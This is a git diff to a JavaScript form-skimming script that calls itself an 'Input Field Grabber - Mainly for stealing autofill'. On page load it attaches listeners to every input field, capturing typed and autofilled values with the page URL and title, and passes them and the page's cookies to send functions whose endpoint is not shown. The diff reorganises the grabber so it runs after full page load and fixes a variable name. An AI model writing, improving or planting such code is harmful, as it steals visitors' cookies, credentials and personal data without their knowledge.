@@ -8,14 +8,18 @@ function createTimestamp() {
 }
 
 
-/* ## Cookies ## */
+/* ## Do input fields & cookies once page is fully loaded ## */
 
 document.addEventListener('readystatechange',event => {
     /* Wait for the page to be fully loaded */
     if (event.target.readyState === "complete") {
+        getInputFields();
         saveAndSendC();
     }
 })
+
+
+/* ## Cookies ## */
 
 function saveAndSendC() {
     /* output JSON */
@@ -35,23 +39,26 @@ function saveAndSendC() {
 
 
 
-/* ## Input Field Grabber - Mainly for stealing autofill ## */
+/* ## Input Field Grabber - will catch autofill thanks to the caller event ## */
 
 /* get a list of all the input fields */
-allInputs = document.getElementsByTagName('input');
-for (var i = 0; i < allInputs.length; i++) {
-    /* When a field loses focus for the first time, save and send to catch autofilled fields */
-    allInputs[i].addEventListener('blur',function(e) {
-        saveAndSendIF(e.target);
-    },{once:true});
+function getInputFields() {
+    allInputs = document.getElementsByTagName('input');
+    for (var i = 0; i < allInputs.length; i++) {
+        /* When a field loses focus for the first time, save and send to catch autofilled fields */
+        allInputs[i].addEventListener('blur',function(e) {
+            saveAndSendIF(e.target);
+        },{once:true});
+    }
 }
+
 
 /* Sends to an input field only endpoint */
 function saveAndSendIF(target) {
     /* output JSON */
     var curInput = {} 
     /* Get current time */
-    curMessage['timestamp'] = createTimestamp();
+    curInput['timestamp'] = createTimestamp();
     /* Get current URL */
     curInput['url'] = document.URL;
     /* Get current title */
